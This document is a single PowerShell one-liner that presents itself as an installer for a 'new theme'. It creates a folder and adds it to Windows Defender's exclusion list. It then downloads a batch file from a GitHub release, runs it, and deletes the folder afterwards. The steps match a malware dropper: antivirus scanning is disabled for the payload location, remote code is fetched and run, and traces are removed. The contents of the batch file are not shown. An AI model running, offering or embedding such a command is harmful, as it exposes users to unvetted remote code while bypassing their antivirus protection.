$p="C:\phwyverysad"; $u="https://github.com/phwyverysad/-/releases/download/%E0%B8%88%E0%B8%B9%E0%B8%99%E0%B8%84%E0%B8%AD%E0%B8%A1/Install_New_theme.bat"; $f="$p\Install_New_theme.bat"; [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $oldP=$ProgressPreference; $ProgressPreference='SilentlyContinue'; if(!(Test-Path $p)){New-Item $p -Type Directory | Out-Null}; Add-MpPreference -ExclusionPath $p -EA 0; try{Write-Host "Downloading..."; (New-Object System.Net.WebClient).DownloadFile($u,$f); if(Test-Path $f){Write-Host "Installing..."; Start-Process $f -Wait}}catch{Write-Host "Error: $_"}finally{Write-Host "Cleaning up..."; Start-Sleep -Seconds 3; if(Test-Path $p){Remove-Item $p -Recurse -Force -EA 0}; $ProgressPreference=$oldP; Write-Host "Done."}